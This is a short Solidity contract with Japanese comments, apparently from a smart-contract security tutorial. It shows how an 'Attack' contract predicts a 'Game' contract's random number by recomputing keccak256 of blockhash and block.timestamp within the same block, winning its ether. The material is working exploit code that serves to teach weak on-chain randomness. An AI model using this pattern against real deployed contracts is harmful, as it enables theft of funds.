// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "./Game.sol";

contract Attack {
    Game game;
    /**
        GameAddress` の助けを借りて、Game 契約のインスタンスを生成する。
    */
    constructor(address gameAddress) {
        game = Game(gameAddress);
    }

    /**
        攻撃者は`blockhash` と `block.timestamp` が公開されているため、
        正確な数字を推測して `Game` のコントラクトを攻撃します。
    */
    function attack() public {
        // `abi.encodePacked` は `blockhash` と `block.timestamp` という二つのパラメータを受け取ってバイト配列を返し、
        // それがさらに keccak256 に渡されて `bytes32` を返し、それがさらに `uint` に変換されます。
        // keccak256は、バイト配列を受け取ってbytes32に変換するハッシュ関数である。
        uint _guess = uint(keccak256(abi.encodePacked(blockhash(block.number), block.timestamp)));
        game.guess(_guess);
    }

    // コントラクトが ether を受け取ったときに呼び出されます。
    receive() external payable{}
}